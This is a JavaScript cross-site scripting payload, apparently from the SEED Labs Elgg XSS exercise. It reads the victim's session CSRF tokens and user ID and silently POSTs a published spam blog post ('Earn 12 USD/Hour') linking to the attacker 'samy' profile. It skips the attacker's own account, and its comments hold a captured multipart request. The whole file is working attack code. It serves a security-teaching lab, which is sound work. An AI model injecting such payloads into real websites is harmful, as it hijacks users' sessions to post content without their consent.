const script_3=async()=>{
    const url=`http://www.seed-server.com/action/blog/save`

    const formData=new FormData();

    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="__elgg_token"

    formData.set(`__elgg_token`, elgg.security.token.__elgg_token);

    // khFCUx7ai81N5ydF-2Imvg
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="__elgg_ts"

    formData.set(`__elgg_ts`, elgg.security.token.__elgg_ts);

    // 1708028564
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="title"

    formData.set(`title`,`Earn 12 USD/Hour`);

    // title
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="excerpt"

    formData.set(`excerpt`,`To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy`);

    // excerpt
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="description"

    formData.set(`description`,`Visit http://www.seed-server.com/profile/samy`);

    // <p>this is the body of the post.</p>

    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="tags"

    formData.set(`tags`,`#money#easy_money#earn_money`)


    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="comments_on"

    formData.set(`comments_on`,`On`);

    // On
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="access_id"

    formData.set(`access_id`,`2`);

    // 2
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="status"

    formData.set(`status`,`published`);

    // published
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="container_guid"

    formData.set(`container_guid`,`${elgg.session.user.guid}`);

    // 56
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="guid"

    formData.set(`guid`,``);

    // 60
    // -----------------------------29592371434031236792292969451
    // Content-Disposition: form-data; name="save"

    formData.set(`save`,`Save`);

    // Save
    // -----------------------------29592371434031236792292969451--

    if (elgg.session.user.guid != 59) {
        await fetch(url, {
            method: `POST`,
            body: formData
        })
    }
}